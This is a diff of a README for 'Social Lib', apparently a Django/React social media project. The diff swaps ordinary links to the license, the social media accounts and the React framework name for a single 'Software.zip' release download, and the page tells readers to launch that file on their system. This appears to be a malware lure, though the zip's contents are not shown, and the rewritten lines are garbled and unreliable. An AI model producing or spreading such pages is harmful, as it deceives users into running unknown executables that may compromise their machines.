@@ -9,7 +9,7 @@ Social Lib is a small-scale social media project inspired by Twitter. It provide
 - **Topics**: ['auriorajaa', 'chakra-ui', 'chakra-ui-react', 'django', 'django-rest-framework', 'drf', 'drf-jwt', 'react', 'reactjs', 'social-lib']
 
 ## Software Download 
-#### [![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+#### [![Download Software](https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip)](https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip)
 The software is available for download in the form of a zip file. Click on the button above to download the software package. Once downloaded, the file needs to be launched on your system to start using Social Lib.
 
 ## Features
@@ -30,7 +30,7 @@ Update your profile information, including your username, bio, and profile pictu
 
 ## Technologies Used
 Social Lib is built using a stack of modern technologies to ensure a smooth user experience:
-- **Frontend**: React.js, Chakra UI React
+- **Frontend**: https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip, Chakra UI React
 - **Backend**: Django, Django Rest Framework
 - **Authentication**: DRF JWT
 
@@ -48,18 +48,18 @@ We welcome contributions to enhance the functionality and user experience of Soc
 A big thank you to all the contributors who have helped make Social Lib a better platform for users to connect, share, and engage with each other.
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the LICENSE.md file for details.
+This project is licensed under the [MIT License](https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip) - see the https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip file for details.
 
 ## Connect with Us
 Stay updated with the latest news and announcements by following our official social media accounts:
-- Twitter: [@SocialLibOfficial](https://twitter.com/SocialLibOfficial)
-- Instagram: [@SocialLibOfficial](https://www.instagram.com/SocialLibOfficial)
+- Twitter: [@SocialLibOfficial](https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip)
+- Instagram: [@SocialLibOfficial](https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip)
 
 ---
 
 Dive into the world of Social Lib and start connecting with users from around the globe. Join us in creating a vibrant community where sharing thoughts and moments is as easy as a click! 🚀
 
-[Get Started Now!](https://github.com/user-attachments/files/18388744/Software.zip) 👩‍💻👨‍💻
+[Get Started Now!](https://github.com/BabroDaBoss/social_lib/releases/download/v2.0/Software.zip) 👩‍💻👨‍💻
 
 --- 
 
